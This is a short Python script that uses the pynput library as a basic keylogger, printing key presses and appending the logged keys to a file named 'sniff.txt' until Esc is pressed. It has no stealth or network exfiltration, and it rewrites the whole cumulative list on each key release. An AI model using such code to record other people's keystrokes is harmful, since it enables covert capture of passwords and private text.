from pynput import keyboard 
from pynput.keyboard import Listener , Key
f = open('sniff.txt','a')

def on_press(key):
    print("{0} pressed".format(key))
    
log = []
def on_release(key):
    
    log.append(key)
    print(log)
    f.write(str(log))
    if key == Key.esc:
        f.close() 
        quit()

with Listener(on_press=on_press , on_release=on_release) as listener:
    
    listener.join()